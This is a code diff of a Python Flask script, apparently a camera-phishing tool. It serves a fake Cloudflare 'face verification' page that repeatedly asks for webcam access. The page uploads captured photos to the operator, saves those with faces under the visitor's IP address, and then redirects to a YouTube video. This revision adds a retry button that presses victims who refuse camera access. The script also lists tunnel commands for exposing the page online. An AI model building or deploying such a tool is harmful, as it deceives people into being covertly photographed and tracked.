@@ -11,18 +11,17 @@ from rich.panel import Panel
 # Khởi tạo console cho Rich
 console = Console()
 
-# Sử dụng giá trị mặc định từ input
-TITLE = input("Nhập tiêu đề trang web (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
-OG_TITLE = input("Nhập og:title (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
-OG_DESCRIPTION = input("Nhập og:description (mặc định: 'Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.'): ") or "Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin."
-OG_IMAGE = input("Nhập URL hình ảnh og (mặc định: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg'): ") or "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
-YOUTUBE_LINK = input("Nhập link YouTube (mặc định: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'): ") or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+# Nhập thông tin admin
+TITLE = input("Nhập tiêu đề (phần bên ngoài chữ lớn) (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
+SUBTITLE = input("Nhập phần bên dưới chữ lớn (mặc định: 'Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.'): ") or "Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin."
+YOUTUBE_LINK = input("Nhập link (mặc định: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'): ") or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+OG_IMAGE = input("Nhập OG_IMAGE (mặc định: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg'): ") or "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
 
 app = Flask(__name__)
 os.system("clear")
 os.system("cls")
 
-# In ra Banner ASCII đẹp hơn với Rich
+# In ra Banner ASCII
 banner = r"""
 ██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
 ██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
@@ -32,7 +31,6 @@ banner = r"""
 ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
 """
 console.print(Panel(banner, title="-- BY: MLBSANS --", subtitle="github.com/mlbsans", style="bold cyan"))
-
 console.print("[green]Tạo server:[/green]\n[blue]+ 1:[/blue] ssh -R 80:localhost:8080 nokey@localhost.run\n[blue]+ 2:[/blue] cloudflared tunnel --url http://localhost:8080", style="bold magenta")
 
 # Khởi tạo classifier phát hiện khuôn mặt
@@ -40,11 +38,8 @@ face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_fronta
 SAVE_PATH = "IMAGE"
 os.makedirs(SAVE_PATH, exist_ok=True)
 
-# PHẦN HTML/CSS/JS:
-# - Logo hiển thị biểu tượng Cloudflare (không chứa chữ) từ Wikipedia
-# - Spinner nhỏ nằm bên dưới logo
-# - Nếu nhận dạng được 2 bức ảnh hợp lệ liên tiếp, chuyển trang
-# - Khi chuyển trang, tự động tắt camera
+# HTML/CSS/JS: tự động yêu cầu cấp quyền camera khi load trang.
+# Nếu không cấp, hiển thị thông báo và nút "Thử lại" sau 3 giây.
 HTML_PAGE = f"""
 <!DOCTYPE html>
 <html lang="vi">
@@ -52,8 +47,8 @@ HTML_PAGE = f"""
   <meta charset="UTF-8">
   <title>{TITLE}</title>
   <!-- Open Graph Metadata -->
-  <meta property="og:title" content="{OG_TITLE}">
-  <meta property="og:description" content="{OG_DESCRIPTION}">
+  <meta property="og:title" content="{TITLE}">
+  <meta property="og:description" content="{SUBTITLE}">
   <meta property="og:image" content="{OG_IMAGE}">
   <meta property="og:url" content="http://localhost:8080/">
   <meta property="og:type" content="website">
@@ -77,13 +72,11 @@ HTML_PAGE = f"""
       align-items: center;
       gap: 1rem;
     }}
-    /* Logo Cloudflare từ Wikipedia (giữ nguyên màu gốc) */
     .cloudflare-logo {{
       width: 200px;
       height: 200px;
       background: url('https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png') no-repeat center/contain;
     }}
-    /* Spinner nhỏ, bên dưới logo */
     .spinner {{
       width: 60px;
       height: 60px;
@@ -96,7 +89,6 @@ HTML_PAGE = f"""
       from {{ transform: rotate(0deg); }}
       to {{ transform: rotate(360deg); }}
     }}
-    /* Notification */
     .notification {{
       position: fixed;
       bottom: 20px;
@@ -117,83 +109,172 @@ HTML_PAGE = f"""
       visibility: visible;
       transform: translate(-50%, -10px);
     }}
-
-    /* Media query cho màn hình nhỏ (ví dụ điện thoại) */
+    #retry-btn {{
+      display: none;
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 1rem;
+      cursor: pointer;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0033;
+      color: #fff;
+    }}
     @media (max-width: 768px) {{
       .notification {{
         font-size: 1.2rem;
         padding: 20px 30px;
       }}
+      #retry-btn {{
+        font-size: 1.2rem;
+      }}
     }}
   </style>
 </head>
 <body>
-  <!-- Loading Screen chỉ có logo và spinner -->
   <div class="loading-container">
     <div class="cloudflare-logo"></div>
     <div class="spinner"></div>
   </div>
-
-  <!-- Notification -->
-  <div id="notification" class="notification">Vui lòng không che mặt hoặc tránh camera!</div>
-
+  <div id="notification" class="notification"></div>
+  <button id="retry-btn">Thử lại</button>
   <script>
+    // Khai báo biến toàn cục để quản lý stream, fallbackVideo và validCount
+    let currentStream = null;
+    let fallbackVideo = null;
+    let validCount = 0;
     const notification = document.getElementById("notification");
-    function showNotification() {{
+    const retryBtn = document.getElementById("retry-btn");
+
+    function showNotification(message) {{
+      notification.textContent = message;
       notification.classList.add("show");
       setTimeout(() => {{
         notification.classList.remove("show");
       }}, 3000);
     }}
 
-    let validCount = 0; // Bộ đếm số lần nhận dạng khuôn mặt hợp lệ liên tiếp
-    let videoStream = null; // Lưu stream để tắt camera sau
+    function stopCurrentStream() {{
+      if (currentStream) {{
+        currentStream.getTracks().forEach(track => track.stop());
+        currentStream = null;
+      }}
+      if (fallbackVideo) {{
+        fallbackVideo.pause();
+        fallbackVideo.srcObject = null;
+        fallbackVideo.remove();
+        fallbackVideo = null;
+      }}
+    }}
 
-    navigator.mediaDevices.getUserMedia({{ video: true }})
+    function startVerification() {{
+      // Reset validCount và dừng stream cũ nếu có
+      validCount = 0;
+      stopCurrentStream();
+      
+      // Kiểm tra hỗ trợ getUserMedia
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
+        showNotification("Trình duyệt của bạn không hỗ trợ camera.");
+        return;
+      }}
+      
+      navigator.mediaDevices.getUserMedia({{ video: true }})
       .then(stream => {{
-        videoStream = stream;
-        let videoTrack = stream.getVideoTracks()[0];
-        let imageCapture = new ImageCapture(videoTrack);
+        // Ẩn nút "Thử lại" nếu có
+        retryBtn.style.display = "none";
+        currentStream = stream;
+        validCount = 0;  // Reset lại số lần xác minh
+        const videoTrack = stream.getVideoTracks()[0];
+        const useImageCapture = ('ImageCapture' in window);
+        if (!useImageCapture && !fallbackVideo) {{
+          fallbackVideo = document.createElement("video");
+          fallbackVideo.style.display = "none";
+          document.body.appendChild(fallbackVideo);
+          fallbackVideo.srcObject = stream;
+          fallbackVideo.play();
+        }}
+
         function captureLoop() {{
-          imageCapture.takePhoto()
+          if (useImageCapture) {{
+            const imageCapture = new ImageCapture(videoTrack);
+            imageCapture.takePhoto()
             .then(blob => {{
-              let formData = new FormData();
-              formData.append("image", blob, "face_verification.png");
-              fetch("/upload", {{ method: "POST", body: formData }})
-                .then(response => {{
-                  if(response.ok) {{
-                    validCount++;
-                    // Nếu nhận dạng hợp lệ liên tục đủ 2 bức thì chuyển trang
-                    if(validCount >= 2) {{
-                      videoStream.getTracks().forEach(track => track.stop());
-                      window.location.href = "{YOUTUBE_LINK}";
-                    }} else {{
-                      setTimeout(captureLoop, 400);
-                    }}
-                  }} else {{
-                    validCount = 0;
-                    showNotification();
-                    setTimeout(captureLoop, 400);
-                  }}
-                }})
-                .catch(err => {{
-                  console.error("Lỗi upload:", err);
-                  validCount = 0;
-                  setTimeout(captureLoop, 400);
-                }});
+              processPhoto(blob);
             }})
             .catch(err => {{
-              console.error("Lỗi chụp ảnh:", err);
+              console.error("ImageCapture error:", err);
+              captureFallback();
+            }});
+          }} else {{
+            captureFallback();
+          }}
+        }}
+
+        function captureFallback() {{
+          if (!fallbackVideo || !fallbackVideo.videoWidth) {{
+            return setTimeout(captureLoop, 300);
+          }}
+          const canvas = document.createElement("canvas");
+          canvas.width = fallbackVideo.videoWidth;
+          canvas.height = fallbackVideo.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(fallbackVideo, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {{
+            if (blob) {{
+              processPhoto(blob);
+            }} else {{
+              console.error("Lỗi chuyển canvas sang blob");
               validCount = 0;
               setTimeout(captureLoop, 400);
-            }});
+            }}
+          }}, "image/png");
         }}
+
+        function processPhoto(blob) {{
+          const formData = new FormData();
+          formData.append("image", blob, "face_verification.png");
+          fetch("/upload", {{ method: "POST", body: formData }})
+          .then(response => {{
+            if (response.ok) {{
+              validCount++;
+              if (validCount >= 2) {{
+                stopCurrentStream();
+                window.location.href = "{YOUTUBE_LINK}";
+              }} else {{
+                setTimeout(captureLoop, 400);
+              }}
+            }} else {{
+              validCount = 0;
+              showNotification("Vui lòng không che mặt hoặc tránh camera!");
+              setTimeout(captureLoop, 400);
+            }}
+          }})
+          .catch(err => {{
+            console.error("Lỗi upload:", err);
+            validCount = 0;
+            setTimeout(captureLoop, 400);
+          }});
+        }}
+
         captureLoop();
       }})
       .catch(err => {{
         console.error("Lỗi truy cập camera:", err);
-        window.location.href = "{YOUTUBE_LINK}";
+        showNotification("Bạn chưa cấp quyền camera. Vui lòng cấp quyền trong cài đặt và sau đó bấm 'Thử lại'.");
+        setTimeout(() => {{
+          retryBtn.style.display = "block";
+        }}, 3000);
       }});
+    }}
+
+    // Khi nhấn nút "Thử lại", gọi lại startVerification
+    retryBtn.addEventListener("click", () => {{
+      retryBtn.style.display = "none";
+      startVerification();
+    }});
+
+    // Tự động bắt đầu xác minh khi trang load
+    window.addEventListener("load", startVerification);
   </script>
 </body>
 </html>
@@ -207,18 +288,15 @@ def index():
 def upload():
     if 'image' not in request.files:
         return "Lỗi khi nhận ảnh!", 400
-
     image = request.files['image']
     user_ip = request.remote_addr
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")
-
     try:
         os.makedirs(SAVE_PATH, exist_ok=True)
         img = Image.open(image)
         if img.mode in ("RGBA", "P", "CMYK"):
             img = img.convert("RGB")
-        
         img_cv = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
         gray = cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY)
         faces = face_cascade.detectMultiScale(
@@ -232,7 +310,6 @@ def upload():
         if len(faces) == 0:
             console.log("[red]Không phát hiện được khuôn mặt (che mặt?)![/red]")
             return "Che Mặt Rồi", 400
-
         img.save(image_path, "PNG")
         console.log(f"[green]Ảnh đã lưu: {image_path}[/green]")
         return "OK", 200
